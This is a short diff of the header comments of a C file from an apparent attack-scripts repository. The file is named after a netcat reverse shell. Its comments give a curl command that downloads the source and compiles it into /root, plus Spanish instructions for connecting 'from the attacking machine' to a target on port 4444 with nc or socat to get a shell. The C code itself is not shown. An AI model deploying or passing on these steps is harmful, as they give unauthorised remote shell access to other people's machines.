@@ -1,6 +1,12 @@
 //
-// curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/BashReversoANetCat6.c > /tmp/BashReversoANetCat6.c; gcc /tmp/BashReversoANetCat6.c -o /root/BashReversoANetCat6
+// curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/BashReversoANetCat.c > /tmp/BashReversoANetCat.c; gcc /tmp/BashReversoANetCat.c -o /root/BashReversoANetCat
 //
+// Conectarse desde la máquina atacante:
+//
+//  Con netcat (no es una terminal completa porque no se puede navegar por midnight commander):
+//    nc 192.168.1.100 4444
+//  Con socat:
+//    socat file:`tty`,raw,echo=0 TCP:192.168.1.100:4444
 
 #include <stdio.h>
 #include <stdlib.h>
